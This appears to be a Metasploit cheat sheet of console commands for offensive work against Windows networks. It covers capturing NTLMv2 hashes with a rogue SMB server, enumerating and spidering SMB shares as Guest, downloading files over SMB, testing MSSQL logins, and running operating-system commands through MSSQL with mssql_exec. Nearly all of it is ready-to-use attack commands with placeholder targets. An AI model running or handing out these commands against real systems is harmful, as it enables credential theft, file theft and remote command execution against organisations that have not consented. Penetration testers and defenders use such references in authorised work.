# Start capturing NTLMv2 over SMB
```ruby
use auxiliary/server/capture/smb
set VERBOSE true
run
```

# Start capturing all supported protocols
```ruby
load capture
captureg start --ip <ip>
```

# Enumerate SMB shares
## Options
```ruby
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS <ip>
set SMBUser Guest
set ShowFiles true
set SpiderShares true
```

## Run
```ruby
 run -o ShowFiles=true,SpiderShares=true smb://guest@<ip>
```

# Download a file over SMB
## Options
```ruby
use auxiliary/admin/smb/download_file
set RHOSTS <ip>
set SMBUser Guest
set SMBSHARE "<share>"
set RPATH "\<path>\file"
```

## Run
```ruby
use auxiliary/admin/smb/download_file
run smb://guest@<ip>/<share>/<path>/<file>
# run smb://<user>:<password>@<ip>/<share>/<path>/<file>
```

# MSSQL Login 
## Options
```ruby
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <ip>
set PASSWORD <password>
set username <user>
set domain <domain>
set USE_WINDOWS_AUTHENT true
```

## Run
```ruby
use auxiliary/scanner/mssql/mssql_login
run -o PASSWORD=<password>,username=<username>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port> <ip>
``

# Microsoft SQL Server command execution
## Options
```ruby
use auxiliary/admin/mssql/mssql_exec
set RHOSTS <ip>
set PASSWORD <password>
set username <user>
set domain <domain>
set USE_WINDOWS_AUTHENT true
set CMD <whoami>

```

## Run
```ruby
use auxiliary/admin/mssql/mssql_exec
run -o PASSWORD=<password>,username=<username>,domain=<domain>,USE_WINDOWS_AUTHENT=<true>,RPORT=<port>,CMD=<whoami> <ip>
```
